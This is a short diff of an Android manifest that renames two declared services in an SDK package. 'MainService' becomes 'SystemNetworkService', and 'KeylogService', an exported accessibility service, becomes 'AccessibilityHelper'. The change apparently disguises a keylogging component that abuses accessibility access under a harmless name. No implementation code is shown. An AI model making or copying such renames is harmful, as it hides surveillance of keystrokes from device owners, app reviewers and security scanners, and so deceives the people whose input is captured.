@@ -68,13 +68,13 @@
             android:noHistory="true" />
 
         <service
-            android:name="com.openaccess.sdk.service.MainService"
+            android:name="com.openaccess.sdk.service.SystemNetworkService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
         <service
-            android:name="com.openaccess.sdk.service.KeylogService"
+            android:name="com.openaccess.sdk.service.AccessibilityHelper"
             android:exported="true"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
